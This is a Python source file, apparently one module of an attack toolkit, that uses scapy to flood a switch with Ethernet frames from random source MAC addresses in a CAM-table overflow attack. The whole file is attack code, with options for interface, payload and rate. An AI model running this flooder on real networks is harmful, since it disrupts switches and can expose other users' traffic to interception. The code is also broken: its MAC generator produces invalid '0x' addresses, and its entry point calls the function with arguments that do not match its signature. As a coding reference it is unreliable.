import scapy.all as scapy
from scapy.all import Ether
import random, time

import sys, os
sys.path.append(os.path.join('..', '..'))
from config import *

def rand_mac()->str:
    return f"{hex(random.randint(0, 255))}:{hex(random.randint(0, 255))}:{hex(random.randint(0, 255))}:{hex(random.randint(0, 255))}:{hex(random.randint(0, 255))}:{hex(random.randint(0, 255))}"

def cam_overflow(args: dict)->None:
    print('CAM-overflow attack module, version 1.0')
    iface = args['iface']
    input = args['input']
    mac_dst = args['mac_dst']
    speed = args['timeout']
    input = 'X'*64 if not input else input
    speed = 500 if not speed else speed
    try:
        print('*CAM-overflow attack started. Ctrl+C to stop')
        scapy.hexdump(Ether(src=rand_mac(), dst=mac_dst if mac_dst else rand_mac()) / (input))
        while True:
            for _ in range(speed):
                try:
                    scapy.sendp(Ether(src=rand_mac(), dst=mac_dst if mac_dst else rand_mac()) / (input), verbose=False, iface=iface)
                except Exception as e:
                    print(f"{Fatal_Error}Packet was not sent: {Error_text}{e}{Clear}")
            time.sleep(1)
    except KeyboardInterrupt:
        print('\nAborted.')

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="CAM-overflow attack module.")
    parser.add_argument("-i", "--iface", help="Network iface send from.", required=False)
    parser.add_argument("-md", "--mac_dst", help="Destination MAC-address.", required=False)
    parser.add_argument("-p", "--input", help="Payload content. The default is X 64 times.", required=False)
    parser.add_argument("-t", "--timeout", help="Speed of sending MAC-addresses. The default is 500 MAC/sec.", required=False, type=int)
    

    arg = parser.parse_args()
    cam_overflow(speed=arg.speed, input=arg.input, iface=arg.iface, mac_dst=arg.mac_dst)